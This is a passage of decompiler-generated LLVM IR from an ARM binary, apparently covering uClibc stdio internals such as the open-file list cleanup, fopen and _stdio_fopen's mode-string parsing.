  %v1_16dc0 = add i32 %v0_16dc0, 60
  %v2_16dc0 = inttoptr i32 %v1_16dc0 to i32*
  %v3_16dc0 = load i32, i32* %v2_16dc0, align 4
  %v1_16dc4 = add i32 %v3_16dc0, -1
  store i32 %v1_16dc4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16dc8 = icmp eq i32 %v1_16dc4, 0
  store i32 %v1_16dc4, i32* %v2_16dc0, align 4
  br i1 %v2_16dc8, label %dec_label_pc_16dd4, label %dec_label_pc_16e34

dec_label_pc_16dd4:                               ; preds = %dec_label_pc_16dc0
  %v0_16dd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_16dd4 = load i32, i32* @r5, align 4
  %v2_16dd4 = add i32 %v1_16dd4, 64
  %v3_16dd4 = inttoptr i32 %v2_16dd4 to i32*
  store i32 %v0_16dd4, i32* %v3_16dd4, align 4
  %v0_16dd8 = load i32, i32* @r5, align 4
  %v1_16dd8 = add i32 %v0_16dd8, 56
  store i32 %v1_16dd8, i32* @r6, align 4
  br label %dec_label_pc_16ddc

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16e0c.dec_label_pc_16ddc_crit_edge, %dec_label_pc_16dd4
  %v0_16de4 = phi i32 [ %v0_16de4.pre, %dec_label_pc_16e0c.dec_label_pc_16ddc_crit_edge ], [ %v1_16dd8, %dec_label_pc_16dd4 ]
  %v0_16ddc = phi i32 [ %v0_16ddc.pre, %dec_label_pc_16e0c.dec_label_pc_16ddc_crit_edge ], [ %v0_16dd8, %dec_label_pc_16dd4 ]
  %v1_16ddc = add i32 %v0_16ddc, 56
  %v2_16ddc = inttoptr i32 %v1_16ddc to i32*
  %v3_16ddc = load i32, i32* %v2_16ddc, align 4
  store i32 %v3_16ddc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16de4, i32* %r2.global-to-local, align 4
  %v1_16de882 = inttoptr i32 %v0_16de4 to i32*
  %v2_16de883 = load i32, i32* %v1_16de882, align 4
  store i32 %v2_16de883, i32* %r3.global-to-local, align 4
  %v3_16dec85 = icmp uge i32 %v2_16de883, %v3_16ddc
  store i1 %v3_16dec85, i1* %cpsr_c.global-to-local, align 1
  %v9_16dec91 = icmp eq i32 %v2_16de883, %v3_16ddc
  br i1 %v9_16dec91, label %dec_label_pc_16df4, label %dec_label_pc_16e0c

dec_label_pc_16df4:                               ; preds = %dec_label_pc_16ddc, %dec_label_pc_16df4.dec_label_pc_16de8_crit_edge
  %v0_16df492 = phi i32 [ %v1_16dec.pre, %dec_label_pc_16df4.dec_label_pc_16de8_crit_edge ], [ %v3_16ddc, %dec_label_pc_16ddc ]
  store i32 %v0_16df492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16e04 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16e04, label %dec_label_pc_16e08, label %dec_label_pc_16df4.dec_label_pc_16de8_crit_edge

dec_label_pc_16df4.dec_label_pc_16de8_crit_edge:  ; preds = %dec_label_pc_16df4
  %v0_16de8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16dec.pre = load i32, i32* @r4, align 4
  %v1_16de8 = inttoptr i32 %v0_16de8.pre to i32*
  %v2_16de8 = load i32, i32* %v1_16de8, align 4
  store i32 %v2_16de8, i32* %r3.global-to-local, align 4
  %v3_16dec = icmp uge i32 %v2_16de8, %v1_16dec.pre
  store i1 %v3_16dec, i1* %cpsr_c.global-to-local, align 1
  %v9_16dec = icmp eq i32 %v2_16de8, %v1_16dec.pre
  br i1 %v9_16dec, label %dec_label_pc_16df4, label %dec_label_pc_16e0c

dec_label_pc_16e08:                               ; preds = %dec_label_pc_16df4
  %v0_16e08 = load i32, i32* @r4, align 4
  store i32 %v0_16e08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e0c

dec_label_pc_16e0c:                               ; preds = %dec_label_pc_16ddc, %dec_label_pc_16df4.dec_label_pc_16de8_crit_edge, %dec_label_pc_16e08
  %v0_16e14 = phi i32 [ %v0_16e08, %dec_label_pc_16e08 ], [ %v2_16de883, %dec_label_pc_16ddc ], [ %v2_16de8, %dec_label_pc_16df4.dec_label_pc_16de8_crit_edge ]
  %v1_16e0c = phi i32 [ %v0_16e08, %dec_label_pc_16e08 ], [ %v3_16ddc, %dec_label_pc_16ddc ], [ %v1_16dec.pre, %dec_label_pc_16df4.dec_label_pc_16de8_crit_edge ]
  %v3_16e0c = icmp uge i32 %v0_16e14, %v1_16e0c
  store i1 %v3_16e0c, i1* %cpsr_c.global-to-local, align 1
  %v9_16e0c = icmp eq i32 %v0_16e14, %v1_16e0c
  br i1 %v9_16e0c, label %dec_label_pc_16e14, label %dec_label_pc_16e0c.dec_label_pc_16ddc_crit_edge

dec_label_pc_16e0c.dec_label_pc_16ddc_crit_edge:  ; preds = %dec_label_pc_16e0c
  %v0_16ddc.pre = load i32, i32* @r5, align 4
  %v0_16de4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16ddc

dec_label_pc_16e14:                               ; preds = %dec_label_pc_16e0c
  %v2_16e14 = icmp ne i32 %v1_16e0c, 0
  store i1 %v2_16e14, i1* %cpsr_c.global-to-local, align 1
  %v7_16e18 = icmp slt i32 %v1_16e0c, 2
  br i1 %v7_16e18, label %dec_label_pc_16e34, label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %dec_label_pc_16e14
  %v0_16e1c = load i32, i32* @r5, align 4
  %v1_16e1c = add i32 %v0_16e1c, 56
  store i32 %v1_16e1c, i32* %r0.global-to-local, align 4
  %v0_16e20 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e20 = add i32 %v0_16e20, 129
  store i32 %v1_16e20, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e34

dec_label_pc_16e34:                               ; preds = %dec_label_pc_16dc0, %dec_label_pc_16da8, %dec_label_pc_16e1c, %dec_label_pc_16e14
  %v0_16e34 = load i32, i32* @r5, align 4
  %v1_16e34 = inttoptr i32 %v0_16e34 to i16*
  %v2_16e34 = load i16, i16* %v1_16e34, align 2
  %v3_16e34 = zext i16 %v2_16e34 to i32
  store i32 %v3_16e34, i32* %r3.global-to-local, align 4
  %v1_16e38 = and i32 %v3_16e34, 16384
  %v2_16e38 = icmp eq i32 %v1_16e38, 0
  br i1 %v2_16e38, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16e34
  %v2_16e3c = add i32 %v0_16e34, 8
  %v3_16e3c = inttoptr i32 %v2_16e3c to i32*
  %v4_16e3c = load i32, i32* %v3_16e3c, align 4
  store i32 %v4_16e3c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16e34, %bb48
  %v1_16e40 = xor i1 %v2_16e38, true
  call void @__pseudo_cond_branch(i1 %v1_16e40, i32 ptrtoint (i32* @global_var_14284.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16e48 = load i32, i32* @r8, align 4
  %v2_16e48 = add i32 %v0_16e48, 160
  %v3_16e48 = inttoptr i32 %v2_16e48 to i32*
  %v4_16e48 = load i32, i32* %v3_16e48, align 4
  store i32 %v4_16e48, i32* @r5, align 4
  %v1_16e4c = add i32 %v4_16e48, 8
  %v2_16e4c = inttoptr i32 %v1_16e4c to i32*
  %v3_16e4c = load i32, i32* %v2_16e4c, align 4
  store i32 %v3_16e4c, i32* %r3.global-to-local, align 4
  %v1_16e50 = load i32, i32* %sl.global-to-local, align 4
  %v3_16e50 = icmp uge i32 %v3_16e4c, %v1_16e50
  store i1 %v3_16e50, i1* %cpsr_c.global-to-local, align 1
  %v9_16e50 = icmp eq i32 %v3_16e4c, %v1_16e50
  br i1 %v9_16e50, label %dec_label_pc_16e98, label %dec_label_pc_16e58

dec_label_pc_16e58:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16e48, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16e6475 = inttoptr i32 %v4_16e48 to i32*
  %v2_16e6476 = load i32, i32* %v1_16e6475, align 4
  store i32 %v2_16e6476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16e6878 = icmp eq i32 %v2_16e6476, 0
  br i1 %v9_16e6878, label %dec_label_pc_16e70, label %dec_label_pc_16e88

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e58, %dec_label_pc_16e70.dec_label_pc_16e64_crit_edge
  %v0_16e7079 = phi i32 [ %v1_16e68.pre, %dec_label_pc_16e70.dec_label_pc_16e64_crit_edge ], [ 0, %dec_label_pc_16e58 ]
  store i32 %v0_16e7079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16e80 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16e80, label %dec_label_pc_16e84, label %dec_label_pc_16e70.dec_label_pc_16e64_crit_edge

dec_label_pc_16e70.dec_label_pc_16e64_crit_edge:  ; preds = %dec_label_pc_16e70
  %v0_16e64.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e68.pre = load i32, i32* @r4, align 4
  %v1_16e64 = inttoptr i32 %v0_16e64.pre to i32*
  %v2_16e64 = load i32, i32* %v1_16e64, align 4
  store i32 %v2_16e64, i32* %r3.global-to-local, align 4
  %v3_16e68 = icmp uge i32 %v2_16e64, %v1_16e68.pre
  store i1 %v3_16e68, i1* %cpsr_c.global-to-local, align 1
  %v9_16e68 = icmp eq i32 %v2_16e64, %v1_16e68.pre
  br i1 %v9_16e68, label %dec_label_pc_16e70, label %dec_label_pc_16e88

dec_label_pc_16e84:                               ; preds = %dec_label_pc_16e70
  %v0_16e84 = load i32, i32* @r4, align 4
  store i32 %v0_16e84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e88

dec_label_pc_16e88:                               ; preds = %dec_label_pc_16e58, %dec_label_pc_16e70.dec_label_pc_16e64_crit_edge, %dec_label_pc_16e84
  %v0_16e88 = phi i32 [ %v0_16e84, %dec_label_pc_16e84 ], [ %v2_16e6476, %dec_label_pc_16e58 ], [ %v2_16e64, %dec_label_pc_16e70.dec_label_pc_16e64_crit_edge ]
  %v1_16e88 = phi i32 [ %v0_16e84, %dec_label_pc_16e84 ], [ 0, %dec_label_pc_16e58 ], [ %v1_16e68.pre, %dec_label_pc_16e70.dec_label_pc_16e64_crit_edge ]
  %v3_16e88 = icmp uge i32 %v0_16e88, %v1_16e88
  store i1 %v3_16e88, i1* %cpsr_c.global-to-local, align 1
  %v9_16e88 = icmp eq i32 %v0_16e88, %v1_16e88
  br i1 %v9_16e88, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_16e88
  %v1_16e8c = load i32, i32* @r5, align 4
  store i32 %v1_16e8c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_16e88, %bb50
  %v1_16e90 = xor i1 %v9_16e88, true
  call void @__pseudo_cond_branch(i1 %v1_16e90, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_16e94 = load i32, i32* %sl.global-to-local, align 4
  %v1_16e94 = load i32, i32* @r5, align 4
  %v2_16e94 = add i32 %v1_16e94, 8
  %v3_16e94 = inttoptr i32 %v2_16e94 to i32*
  store i32 %v0_16e94, i32* %v3_16e94, align 4
  %v0_16e9c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %bb49, %bb51
  %v0_16e9c = phi i32 [ %v0_16e48, %bb49 ], [ %v0_16e9c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_16e9c = add i32 %v0_16e9c, 80
  %v3_16e9c = inttoptr i32 %v2_16e9c to i32*
  %v4_16e9c = load i32, i32* %v3_16e9c, align 4
  store i32 %v4_16e9c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_16ea4 = add i32 %v0_16e9c, 160
  %v3_16ea4 = inttoptr i32 %v2_16ea4 to i32*
  %v4_16ea4 = load i32, i32* %v3_16ea4, align 4
  store i32 %v4_16ea4, i32* %r0.global-to-local, align 4
  %v1_16ea8 = inttoptr i32 %v4_16e9c to i32*
  %v2_16ea8 = load i32, i32* %v1_16ea8, align 4
  store i32 %v2_16ea8, i32* %r3.global-to-local, align 4
  %v1_16eac = add i32 %v4_16ea4, 4
  %v2_16eac = inttoptr i32 %v1_16eac to i32*
  %v3_16eac = load i32, i32* %v2_16eac, align 4
  store i32 %v3_16eac, i32* %r1.global-to-local, align 4
  %v1_16eb0 = add i32 %v2_16ea8, 1
  store i32 %v1_16eb0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16eb4 = icmp eq i32 %v3_16eac, 0
  store i32 %v1_16eb0, i32* %v1_16ea8, align 4
  br i1 %v2_16eb4, label %dec_label_pc_16ec0, label %dec_label_pc_16f20

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16e98
  %v0_16ec0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ec0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16ec0 = add i32 %v1_16ec0, 8
  %v3_16ec0 = inttoptr i32 %v2_16ec0 to i32*
  store i32 %v0_16ec0, i32* %v3_16ec0, align 4
  %v0_16ec4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16ec4, i32* @r5, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16ef8.dec_label_pc_16ec8_crit_edge, %dec_label_pc_16ec0
  %v0_16ec8 = phi i32 [ %v0_16ec8.pre, %dec_label_pc_16ef8.dec_label_pc_16ec8_crit_edge ], [ %v0_16ec4, %dec_label_pc_16ec0 ]
  %v1_16ec8 = inttoptr i32 %v0_16ec8 to i32*
  %v2_16ec8 = load i32, i32* %v1_16ec8, align 4
  store i32 %v2_16ec8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16ec8, i32* %r2.global-to-local, align 4
  %v2_16ed464 = load i32, i32* %v1_16ec8, align 4
  store i32 %v2_16ed464, i32* %r3.global-to-local, align 4
  %v3_16ed866 = icmp uge i32 %v2_16ed464, %v2_16ec8
  store i1 %v3_16ed866, i1* %cpsr_c.global-to-local, align 1
  %v9_16ed872 = icmp eq i32 %v2_16ed464, %v2_16ec8
  br i1 %v9_16ed872, label %dec_label_pc_16ee0, label %dec_label_pc_16ef8

dec_label_pc_16ee0:                               ; preds = %dec_label_pc_16ec8, %dec_label_pc_16ee0.dec_label_pc_16ed4_crit_edge
  %v0_16ee073 = phi i32 [ %v1_16ed8.pre, %dec_label_pc_16ee0.dec_label_pc_16ed4_crit_edge ], [ %v2_16ec8, %dec_label_pc_16ec8 ]
  store i32 %v0_16ee073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ef0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ef0, label %dec_label_pc_16ef4, label %dec_label_pc_16ee0.dec_label_pc_16ed4_crit_edge

dec_label_pc_16ee0.dec_label_pc_16ed4_crit_edge:  ; preds = %dec_label_pc_16ee0
  %v0_16ed4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ed8.pre = load i32, i32* @r4, align 4
  %v1_16ed4 = inttoptr i32 %v0_16ed4.pre to i32*
  %v2_16ed4 = load i32, i32* %v1_16ed4, align 4
  store i32 %v2_16ed4, i32* %r3.global-to-local, align 4
  %v3_16ed8 = icmp uge i32 %v2_16ed4, %v1_16ed8.pre
  store i1 %v3_16ed8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ed8 = icmp eq i32 %v2_16ed4, %v1_16ed8.pre
  br i1 %v9_16ed8, label %dec_label_pc_16ee0, label %dec_label_pc_16ef8

dec_label_pc_16ef4:                               ; preds = %dec_label_pc_16ee0
  %v0_16ef4 = load i32, i32* @r4, align 4
  store i32 %v0_16ef4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ef8

dec_label_pc_16ef8:                               ; preds = %dec_label_pc_16ec8, %dec_label_pc_16ee0.dec_label_pc_16ed4_crit_edge, %dec_label_pc_16ef4
  %v0_16f00 = phi i32 [ %v0_16ef4, %dec_label_pc_16ef4 ], [ %v2_16ed464, %dec_label_pc_16ec8 ], [ %v2_16ed4, %dec_label_pc_16ee0.dec_label_pc_16ed4_crit_edge ]
  %v1_16ef8 = phi i32 [ %v0_16ef4, %dec_label_pc_16ef4 ], [ %v2_16ec8, %dec_label_pc_16ec8 ], [ %v1_16ed8.pre, %dec_label_pc_16ee0.dec_label_pc_16ed4_crit_edge ]
  %v3_16ef8 = icmp uge i32 %v0_16f00, %v1_16ef8
  store i1 %v3_16ef8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ef8 = icmp eq i32 %v0_16f00, %v1_16ef8
  br i1 %v9_16ef8, label %dec_label_pc_16f00, label %dec_label_pc_16ef8.dec_label_pc_16ec8_crit_edge

dec_label_pc_16ef8.dec_label_pc_16ec8_crit_edge:  ; preds = %dec_label_pc_16ef8
  %v0_16ec8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16ef8
  %v2_16f00 = icmp ne i32 %v1_16ef8, 0
  store i1 %v2_16f00, i1* %cpsr_c.global-to-local, align 1
  %v7_16f04 = icmp slt i32 %v1_16ef8, 2
  br i1 %v7_16f04, label %dec_label_pc_16f20, label %dec_label_pc_16f08

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16f00
  %v0_16f08 = load i32, i32* @r5, align 4
  store i32 %v0_16f08, i32* %r0.global-to-local, align 4
  %v0_16f0c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f0c = add i32 %v0_16f0c, 129
  store i32 %v1_16f0c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f20

dec_label_pc_16f20:                               ; preds = %dec_label_pc_16e98, %dec_label_pc_16f08, %dec_label_pc_16f00
  %v0_16f20 = call i32 @_stdio_openlist_dec_use()
  %v0_16f24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16f24, i32* %r0.global-to-local, align 4
  %v2_16f2c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16f2c, i32* @r4, align 4
  store i32 %v6_16c14, i32* @r5, align 4
  store i32 %v9_16c14, i32* @r6, align 4
  store i32 %v12_16c14, i32* @r7, align 4
  ret i32 %v0_16f24

; uselistorder directives
  uselistorder i32 %v0_16ef4, { 1, 0, 2 }
  uselistorder i32 %v1_16ed8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16ec8, { 1, 0 }
  uselistorder i32 %v0_16e9c, { 1, 0 }
  uselistorder i32 %v0_16e84, { 1, 0, 2 }
  uselistorder i32 %v1_16e68.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16e50, { 1, 0 }
  uselistorder i32 %v0_16e08, { 1, 0, 2 }
  uselistorder i32 %v1_16dec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d7c, { 1, 0, 2 }
  uselistorder i32 %v1_16d60.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d50, { 1, 0 }
  uselistorder i32 %v0_16d0c, { 1, 0, 2 }
  uselistorder i32 %v1_16cf0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16cd0, { 1, 0 }
  uselistorder i32 %v1_16c5c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 43, 4, 5, 6, 7, 8, 10, 9, 41, 11, 14, 12, 13, 15, 17, 16, 42, 18, 19, 20, 21, 22, 24, 23, 46, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 44, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 30, 31, 4, 5, 6, 26, 27, 7, 8, 9, 10, 28, 29, 11, 12, 13, 14, 16, 15, 0, 17, 18, 19, 34, 35, 20, 21, 22, 23, 32, 33, 24, 25 }
  uselistorder i32 (i32)* @__GI___libc_close, { 27, 26, 30, 25, 29, 28, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_16f20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16ef8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ee0, { 1, 0 }
  uselistorder label %dec_label_pc_16e98, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_16e88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e70, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16e34, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16e0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16df4, { 1, 0 }
  uselistorder label %dec_label_pc_16da8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16d80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d68, { 1, 0 }
  uselistorder label %dec_label_pc_16d20, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16d10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16cf8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_16c98, { 1, 0 }
  uselistorder label %dec_label_pc_16c8c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_16c7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c64, { 1, 0 }
}

define i32 @function_16f38(i32 %arg1) local_unnamed_addr {
dec_label_pc_16f38:
  %v0_16f38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16f38, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16f38
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16f38, %bb
  %v10_16f40 = phi i32 [ %arg1, %dec_label_pc_16f38 ], [ 0, %bb ]
  ret i32 %v10_16f40

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16f54 = call i32 @_stdio_fopen()
  ret i32 %v0_16f54
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16f64 = load i32, i32* @r4, align 4
  store i32 %v3_16f64, i32* %stack_var_-24, align 4
  %v6_16f64 = load i32, i32* @r5, align 4
  %v9_16f64 = load i32, i32* @r6, align 4
  %v12_16f64 = load i32, i32* @r7, align 4
  %v15_16f64 = load i32, i32* @r8, align 4
  %v0_16f68 = load i32, i32* @r1, align 4
  %v1_16f68 = inttoptr i32 %v0_16f68 to i8*
  %v2_16f68 = load i8, i8* %v1_16f68, align 1
  %v2_16f70 = icmp ugt i8 %v2_16f68, 113
  store i1 %v2_16f70, i1* %cpsr_c.global-to-local, align 1
  %v7_16f70 = icmp eq i8 %v2_16f68, 114
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r8, align 4
  %v0_16f7c = load i32, i32* @r0, align 4
  store i32 %v0_16f7c, i32* @r7, align 4
  %v0_16f80 = load i32, i32* @r2, align 4
  store i32 %v0_16f80, i32* @r5, align 4
  %v0_16f84 = load i32, i32* @r3, align 4
  store i32 %v0_16f84, i32* @r6, align 4
  br i1 %v7_16f70, label %dec_label_pc_16fd8, label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %entry
  %v2_16f8c = icmp ugt i8 %v2_16f68, 118
  store i1 %v2_16f8c, i1* %cpsr_c.global-to-local, align 1
  %v7_16f8c = icmp eq i8 %v2_16f68, 119
  br i1 %v7_16f8c, label %bb, label %dec_label_pc_16f98

bb:                                               ; preds = %dec_label_pc_16f8c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_16fdc

dec_label_pc_16f98:                               ; preds = %dec_label_pc_16f8c
  %v2_16f98 = icmp ugt i8 %v2_16f68, 96
  store i1 %v2_16f98, i1* %cpsr_c.global-to-local, align 1
  %v7_16f98 = icmp eq i8 %v2_16f68, 97
  br i1 %v7_16f98, label %bb49, label %dec_label_pc_16fa4

bb49:                                             ; preds = %dec_label_pc_16f98
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_16fdc

dec_label_pc_16fa4:                               ; preds = %dec_label_pc_16f98, %dec_label_pc_17074, %dec_label_pc_17048
  store i32 49332, i32* %r2.global-to-local, align 4
  %v0_16fa8 = call i32 @__aeabi_read_tp()
  store i32 %v0_16fa8, i32* %r0.global-to-local, align 4
  %v3_16fac = load i16, i16* @global_var_23068.362, align 2
  %v4_16fac = sext i16 %v3_16fac to i32
  store i32 %v4_16fac, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_16fb4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16fb4 = icmp eq i32 %v0_16fb4, 0
  %v3_16fb8 = add i32 %v4_16fac, %v0_16fa8
  %v4_16fb8 = inttoptr i32 %v3_16fb8 to i32*
  store i32 22, i32* %v4_16fb8, align 4
  br i1 %v2_16fb4, label %dec_label_pc_1737c, label %dec_label_pc_16fc0

dec_label_pc_16fc0:                               ; preds = %dec_label_pc_17098._crit_edge, %dec_label_pc_16fa4
  %v0_16fc0 = load i32, i32* @r5, align 4
  %v1_16fc0 = inttoptr i32 %v0_16fc0 to i16*
  %v2_16fc0 = load i16, i16* %v1_16fc0, align 2
  %v3_16fc0 = zext i16 %v2_16fc0 to i32
  store i32 %v3_16fc0, i32* %r3.global-to-local, align 4
  %v1_16fc4 = and i32 %v3_16fc0, 8192
  %v2_16fc4 = icmp eq i32 %v1_16fc4, 0
  br i1 %v2_16fc4, label %dec_label_pc_1737c, label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fc0
  store i32 %v0_16fc0, i32* @r0, align 4
  %v0_16fd0 = call i32 @free()
  store i32 %v0_16fd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1737c

dec_label_pc_16fd8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16fdc

dec_label_pc_16fdc:                               ; preds = %bb, %bb49, %dec_label_pc_16fd8
  %v1_16ff4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_16fd8 ]
  %v1_16fdc = add i32 %v0_16f68, 1
  %v2_16fdc = inttoptr i32 %v1_16fdc to i8*
  %v3_16fdc = load i8, i8* %v2_16fdc, align 1
  %v2_16fe0 = icmp ugt i8 %v3_16fdc, 97
  store i1 %v2_16fe0, i1* %cpsr_c.global-to-local, align 1
  %v7_16fe0 = icmp eq i8 %v3_16fdc, 98
  %v1_16fdc.v0_16f68 = select i1 %v7_16fe0, i32 %v1_16fdc, i32 %v0_16f68
  store i32 %v1_16fdc.v0_16f68, i32* %r3.global-to-local, align 4
  %v1_16fec = add i32 %v1_16fdc.v0_16f68, 1
  %v2_16fec = inttoptr i32 %v1_16fec to i8*
  %v3_16fec = load i8, i8* %v2_16fec, align 1
  %v4_16fec = zext i8 %v3_16fec to i32
  store i32 %v4_16fec, i32* @r3, align 4
  %v2_16ff0 = icmp ugt i8 %v3_16fec, 42
  store i1 %v2_16ff0, i1* %cpsr_c.global-to-local, align 1
  %v7_16ff0 = icmp eq i8 %v3_16fec, 43
  br i1 %v7_16ff0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_16fdc
  store i32 %v1_16ff4, i32* @r3, align 4
  %v2_16ff8 = add nuw nsw i32 %v1_16ff4, 1
  store i32 %v2_16ff8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16fdc, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ffc = icmp eq i32 %v0_16f80, 0
  br i1 %v2_16ffc, label %dec_label_pc_17004, label %dec_label_pc_17040

dec_label_pc_17004:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_17008 = call i32 @malloc()
  store i32 %v0_17008, i32* %r0.global-to-local, align 4
  store i32 %v0_17008, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1700c = icmp eq i32 %v0_17008, 0
  br i1 %v3_1700c, label %dec_label_pc_17380, label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %dec_label_pc_17004
  %v0_17018 = load i32, i32* @r8, align 4
  %v2_17018 = add i32 %v0_17018, -33416
  store i32 %v2_17018, i32* %r3.global-to-local, align 4
